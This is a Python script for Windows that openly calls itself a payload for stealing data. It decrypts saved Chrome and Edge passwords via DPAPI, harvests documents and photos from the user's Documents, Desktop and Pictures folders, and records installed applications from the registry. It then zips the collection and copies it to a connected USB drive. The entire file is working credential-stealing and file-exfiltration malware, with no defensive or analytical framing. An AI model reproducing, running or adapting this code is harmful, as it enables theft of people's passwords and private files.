import os
import shutil
import sqlite3
import getpass
import json
import ctypes
import ctypes.wintypes
import winreg  # For accessing the Windows Registry

# Function to copy the database file to avoid locks
def copy_database_file(original_path):
    temp_path = os.path.join(os.getenv('TEMP'), 'temp_login_data')
    shutil.copy2(original_path, temp_path)
    return temp_path

# Function to extract Chrome passwords
def extract_chrome_passwords():
    data_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    if not os.path.exists(data_path):
        return []
    
    # Copy the database file to avoid locks
    temp_path = copy_database_file(data_path)
    
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = []
    
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        print(f"Encrypted Data: {encrypted_password}")  # Debugging
        decrypted_password = decrypt_password(encrypted_password)
        passwords.append({'url': url, 'username': username, 'password': decrypted_password})
    
    cursor.close()
    conn.close()
    os.remove(temp_path)  # Clean up the temporary file
    return passwords

# Function to extract Edge passwords
def extract_edge_passwords():
    data_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
    if not os.path.exists(data_path):
        return []
    
    # Copy the database file to avoid locks
    temp_path = copy_database_file(data_path)
    
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = []
    
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        print(f"Encrypted Data: {encrypted_password}")  # Debugging
        decrypted_password = decrypt_password(encrypted_password)
        passwords.append({'url': url, 'username': username, 'password': decrypted_password})
    
    cursor.close()
    conn.close()
    os.remove(temp_path)  # Clean up the temporary file
    return passwords

# Function to decrypt passwords using Windows DPAPI
def decrypt_password(encrypted_password):
    try:
        if not encrypted_password:
            return "Empty encrypted data"
        
        # Define necessary structures and functions
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]
        
        CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
        CryptUnprotectData.argtypes = [
            ctypes.POINTER(DATA_BLOB),  # pDataIn
            ctypes.c_wchar_p,           # ppszDataDescr
            ctypes.POINTER(DATA_BLOB),  # pOptionalEntropy
            ctypes.c_void_p,            # pvReserved
            ctypes.c_void_p,            # pPromptStruct
            ctypes.c_uint,              # dwFlags
            ctypes.POINTER(DATA_BLOB)   # pDataOut
        ]
        CryptUnprotectData.restype = ctypes.c_int
        
        # Convert encrypted password to DATA_BLOB
        blob_in = DATA_BLOB()
        blob_in.cbData = len(encrypted_password)
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_password), ctypes.POINTER(ctypes.c_char))
        
        blob_out = DATA_BLOB()
        
        # Call CryptUnprotectData to decrypt
        if CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            return decrypted_data.decode('utf-8')
        else:
            return "Failed to decrypt"
    except Exception as e:
        return f"Error: {str(e)}"

# Function to find a connected USB drive
def find_usb_drive():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        try:
            # Check if the drive is removable (USB drives are typically removable)
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
            if drive_type == 2:  # DRIVE_REMOVABLE (USB drives)
                return drive
        except Exception:
            continue
    return None

# Function to list installed applications
def list_installed_applications():
    installed_apps = []
    try:
        # Open the Uninstall registry key
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        
        # Iterate over all subkeys
        for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
            subkey_name = winreg.EnumKey(reg_key, i)
            subkey = winreg.OpenKey(reg_key, subkey_name)
            
            try:
                # Get the display name of the application
                app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                installed_apps.append(app_name)
            except FileNotFoundError:
                # Skip if DisplayName is not found
                continue
            finally:
                winreg.CloseKey(subkey)
        
        winreg.CloseKey(reg_key)
    except Exception as e:
        print(f"Error accessing registry: {e}")
    
    return installed_apps

# Function to exfiltrate data
def exfiltrate_data():
    # Gather sensitive data
    user = getpass.getuser()
    documents_path = os.path.join('C:\\Users', user, 'Documents')
    desktop_path = os.path.join('C:\\Users', user, 'Desktop')
    pictures_path = os.path.join('C:\\Users', user, 'Pictures')
    
    # Create a temporary directory to store the collected data
    temp_dir = os.path.join('C:\\Users', user, 'TempCollectedData')
    os.makedirs(temp_dir, exist_ok=True)
    
    # Copy documents, PDFs, photos, and other files
    for root, dirs, files in os.walk(documents_path):
        for file in files:
            if file.endswith(('.pdf', '.doc', '.docx', '.txt', '.jpg', '.png')):
                shutil.copy(os.path.join(root, file), temp_dir)
    
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith(('.pdf', '.doc', '.docx', '.txt', '.jpg', '.png')):
                shutil.copy(os.path.join(root, file), temp_dir)
    
    for root, dirs, files in os.walk(pictures_path):
        for file in files:
            if file.endswith(('.jpg', '.png')):
                shutil.copy(os.path.join(root, file), temp_dir)
    
    # Extract saved passwords from Google Chrome
    chrome_passwords = extract_chrome_passwords()
    with open(os.path.join(temp_dir, 'chrome_passwords.txt'), 'w') as f:
        json.dump(chrome_passwords, f)
    
    # Extract saved passwords from Microsoft Edge
    edge_passwords = extract_edge_passwords()
    with open(os.path.join(temp_dir, 'edge_passwords.txt'), 'w') as f:
        json.dump(edge_passwords, f)
    
    # List installed applications
    installed_apps = list_installed_applications()
    with open(os.path.join(temp_dir, 'installed_apps.txt'), 'w') as f:
        for app in installed_apps:
            f.write(f"{app}\n")
    
    # Compress the collected data into a ZIP file
    zip_path = os.path.join('C:\\Users', user, 'CollectedData.zip')
    shutil.make_archive(zip_path[:-4], 'zip', temp_dir)
    
    # Clean up the temporary directory
    shutil.rmtree(temp_dir)
    
    return zip_path

# Main function to execute the payload
def main():
    zip_path = exfiltrate_data()
    # Copy the ZIP file to a USB drive if connected
    usb_drive = find_usb_drive()
    if usb_drive:
        shutil.copy(zip_path, usb_drive)
        print(f"Data copied to USB drive: {usb_drive}")
    else:
        print("No USB drive found.")

if __name__ == "__main__":
    main()
